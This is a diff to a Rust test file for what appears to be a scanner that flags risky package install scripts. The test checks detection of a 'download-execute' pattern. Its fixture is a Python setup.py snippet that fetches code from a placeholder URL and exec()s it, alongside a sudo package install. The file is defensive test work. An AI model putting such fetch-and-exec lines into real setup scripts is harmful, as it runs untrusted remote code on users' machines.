@@ -226,15 +226,22 @@ sudo pacman -S --noconfirm somepackage
 fn python_variants_cover_the_same_families() {
     let helper = r#"import urllib.request
 data = urllib.request.urlopen("https://example.test/x").read(); exec(data)
-sudo pacman -S base-devel
+import os
+os.system("sudo pacman -S base-devel")
 "#;
     let (artifacts, _) = run(
         vec![entry("setup.py", PayloadKind::Python, helper.len())],
         &[("setup.py", helper.as_bytes())],
     );
     let ids = rule_ids(&artifacts);
+    #[cfg(feature = "python-parser")]
     assert!(
         ids.contains(&"oma.python.download-execute".to_owned()),
+        "{ids:?}"
+    );
+    #[cfg(not(feature = "python-parser"))]
+    assert!(
+        !ids.contains(&"oma.python.download-execute".to_owned()),
         "{ids:?}"
     );
     // Plain sudo without sudoers/NOPASSWD is a capability, not a finding.
